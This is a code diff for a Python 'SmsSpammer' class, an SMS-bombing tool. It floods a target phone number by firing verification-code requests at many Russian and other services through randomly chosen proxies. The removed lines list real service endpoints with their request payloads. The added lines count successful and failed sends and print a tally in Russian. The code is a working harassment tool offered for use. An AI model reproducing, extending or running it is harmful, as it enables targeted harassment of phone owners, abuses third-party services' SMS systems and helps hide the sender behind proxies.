@@ -56,55 +56,6 @@ class SmsSpammer:
         services = services.replace("$email$",self.email)
         services = services.replace("$password$",self.password)
         self.servicesURLs = json.loads(services)
-        print(self.servicesURLs)
-        exit()
-        # self.servicesURLs = [
-      # {"url": "https://ng-api.webbankir.com/user/v2/create",
-      # "kind": "json",
-      # "data": {"lastName":"иванов","firstName":"иван","middleName":"иванович","mobilePhone":self.phoneNumber,"email":self.email,"smsCode":""}},
-      # {"url": "https://m.tiktok.com/node-a/send/download_link",
-      # "kind": "json",
-      # "data": {"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":self.phoneNumber[1:],"page":{"pageName":"home","launchMode":"direct","trafficType":""}}},
-      # {"url": "https://msk.tele2.ru/api/validation/number/",
-      # "kind": "json",
-      # "data": {"sender": "Tele2"}},
-      # {"url": "https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
-      # "kind": "json",
-      # "data": {"phone": self.phoneNumber, "otpId": 0}},
-      # {"url": "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-      # "kind": "data",
-      # "data": {"st.r.phone": "+"+self.phoneNumber}},
-      # {"url": "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
-      # "kind": "params",
-      # "data": {"msisdn": self.phoneNumber}},
-      # {"url": "https://moneyman.ru/registration_api/actions/send-confirmation-code",
-      # "kind": "params",
-      # "data": {"+"+self.phoneNumber}},
-      # {"url": "https://my.modulbank.ru/api/v2/registration/nameAndPhone",
-      # "kind": "json",
-      # "data": {"FirstName": self.name, "CellPhone": self.phoneNumber, "Package": "optimal"}},
-      # {"url": "https://lenta.com/api/v1/authentication/requestValidationCode",
-      # "kind": "json",
-      # "data": {"phone": "+"+self.phoneNumber}},
-      # {"url": "https://api.imgur.com/account/v1/phones/verify",
-      # "kind": "json",
-      # "data": {"phone_number": self.phoneNumber, "region_code": "RU"}},
-      # {"url": "https://www.icq.com/smsreg/requestPhoneValidation.php",
-      # "kind": "data",
-      # "data": {"msisdn": self.phoneNumber,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}},
-      # {"url": "https://api.eldorado.ua/v1/sign/",
-      # "kind": "params",
-      # "data": {"login": self.phoneNumber,"step": "phone-check","fb_id": "null","fb_token": "null","lang": "ru"}},
-      # {"url": "https://www.citilink.ru/registration/confirm/phone/"+self.phoneNumber+"/",
-      # "kind": "data",
-      # "data": ""},
-      # {"url": "https://youla.ru/web-api/auth/request_code",
-      # "kind": "data",
-      # "data": {"phone": self.phoneNumber} },
-      # {"url": "https://eda.yandex/api/v1/user/request_authentication_code",
-      # "kind": "json",
-      # "data": {"phone_number": "+"+self.phoneNumber} }
-      # ]
         
     async def asyncSendSMS(self,session, websiteData,proxy, i):
         # print("started: "+str(i)+" ,proxy:"+proxy)
@@ -115,9 +66,10 @@ class SmsSpammer:
                 await session.post(websiteData["url"], json=websiteData["data"], proxy="http://"+proxy, timeout=self.timeout)
             elif websiteData["kind"] == "params":
                 await session.post(websiteData["url"], params=websiteData["data"], proxy="http://"+proxy, timeout=self.timeout)
+            return 1
         except Exception as e:
-            print(e)
             self.timeoutCounter = self.timeoutCounter + 1
+            return 2
 
 
     async def asyncSending(self):
@@ -128,17 +80,19 @@ class SmsSpammer:
                 proxy = random.choice(self.proxies)
                 tasks.append(self.asyncSendSMS(session, service,proxy,i))
                 i+=1
-            htmls = await asyncio.gather(*tasks)
-            for html in htmls:
-                print(html)
+            results = await asyncio.gather(*tasks)
+            successes = 0
+            failures = 0
+            for r in results:
+                if r == 2:
+                    failures += 1
+                if r == 1:
+                    successes += 1
+            print("Успешно отосланно: "+str(successes)+", не получилось отослать:"+str(failures))
 
 
     def startSending(self):
             self.addparams()
-            # for service in self.servicesURLs:
             loop = asyncio.get_event_loop()
             loop.run_until_complete(self.asyncSending())
-                # task = asyncio.create_task(self.sendSms(service))
-                # tasks.append(task)
-                # asyncio.run(self.sendSms(service))
-            exit()
+            # exit()
